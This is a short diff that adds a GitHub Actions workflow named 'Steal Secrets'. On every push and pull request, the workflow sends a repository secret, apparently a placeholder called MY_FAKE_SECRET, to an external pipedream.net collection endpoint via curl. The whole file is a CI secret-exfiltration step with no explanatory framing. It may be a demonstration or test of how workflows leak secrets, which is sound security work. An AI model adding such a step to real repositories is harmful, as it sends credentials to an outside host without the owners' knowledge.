@@ -1,0 +1,8 @@
+name: Steal Secrets
+on: [push, pull_request]
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get repository secret
+        run: curl https://eohjy9mxotnbhvm.m.pipedream.net?secret={{ secrets.MY_FAKE_SECRET }}
